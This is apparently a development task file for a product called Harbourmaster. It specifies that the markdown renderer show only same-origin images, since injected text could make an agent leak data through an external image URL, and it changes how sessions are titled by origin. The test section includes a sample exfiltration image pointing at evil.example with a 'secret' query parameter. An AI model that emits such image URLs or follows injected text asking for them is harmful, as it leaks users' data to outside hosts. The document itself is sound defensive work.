---
id: U.2
title: Safe markdown images and origin-based session titles
milestone: U
size: S
status: in_progress
depends_on: [U.1]
branch: task/U.2-images-and-titles
---

From U.1's review (docs/reviews/tasks/U.1.md), approved by Dom on 16 Oct 2026.

## Scope

1. Markdown images in agent text load from any URL, so an agent fed injected text can leak data through an image URL. The shared markdown renderer shows an image only when its URL points at Harbourmaster's own files (`/files/<id>`) or library download route on the same origin. Any other image renders as a plain link showing its URL, not loaded.
2. Sessions not started in the chat take their title from the first message. Title them by origin instead: a Slack session gets its channel name (or "DM with <user>") plus the start of the first message, an inbox session its thread subject, a trigger session its trigger name, and a routine session its routine name. Fall back to the U.1 title when the source name is gone. Compute the title where U.1 does, with no new tables.

## Check

Renderer tests: an `![x](https://evil.example/a.png?d=secret)` image renders as a link, not an `<img>`; a same-origin `/files/<id>` image renders as an `<img>`. Title tests cover each origin and the fallback. Browser, with dev login on a local dev server: the sessions list shows a trigger session and a routine session under their names. `bun run check && bun run test && bun run build` pass.

## Log
- 2026-10-16: added from U.1's review (Dom: yes); dispatched on task/U.2-images-and-titles.
